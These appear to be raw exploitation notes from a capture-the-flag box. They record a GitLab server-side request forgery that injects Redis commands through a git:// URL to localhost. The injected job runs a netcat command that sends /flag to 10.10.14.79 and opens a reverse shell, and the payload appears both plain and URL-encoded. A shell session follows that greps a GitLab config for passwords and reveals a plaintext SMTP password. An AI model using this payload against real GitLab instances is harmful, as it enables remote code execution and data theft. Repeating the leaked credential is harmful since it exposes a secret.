git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|cat /flag | nc 10.10.14.79 1234 -e /bin/bash \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git

git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%%0A%20multi%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open(%5C%27%7Ccat%20%2Fflag%20%7C%20nc%2010.10.14.79%201234%20-e%20%2Fbin%2Fbash%20%5C%27).read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A%2Fssrf.git


git@gitlab:/opt/backup$ cat gitlab.rb | grep password
cat gitlab.rb | grep password
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil
